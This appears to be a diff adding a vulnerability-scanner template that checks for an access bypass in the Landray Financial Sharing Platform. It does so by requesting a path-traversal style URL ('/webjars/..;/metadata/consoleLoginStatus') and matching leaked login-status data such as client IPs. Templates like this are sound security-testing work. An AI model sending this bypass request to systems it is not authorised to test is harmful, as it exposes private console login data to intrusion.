@@ -1,0 +1,24 @@
+id: poc-yaml-landray-financial-sharing-bypass
+info:
+  name: Landray Financial Sharing Platform Access Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-bypass
+
+http:
+  - method: GET
+    path:
+      - "/webjars/..;/metadata/consoleLoginStatus"
+    headers:
+      Host: "{{Hostname}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"items\":[{\"clientIp\":"
+          - "\"loginFailureTime\""
+          - "consoleLoginStatus/metadata/consoleLoginStatus"
+        part: body
